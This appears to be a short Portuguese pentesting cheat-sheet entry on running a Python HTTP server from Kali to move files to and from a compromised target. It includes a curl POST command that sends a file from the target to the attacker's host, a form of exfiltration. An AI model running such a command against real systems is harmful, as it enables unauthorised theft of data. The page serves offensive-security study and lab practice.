---
title: "Upload Server"
---

# Upload Server

Servidor HTTP Python para transferência de arquivos entre o Kali e o alvo. O servidor serve arquivos via GET e aceita uploads via POST com curl.

```shell
# Servir arquivos (download pelo alvo)
python3 -m http.server 80

# Receber arquivo enviado pelo alvo
curl -X POST http://kali/upload -F 'files=@file.txt'
```
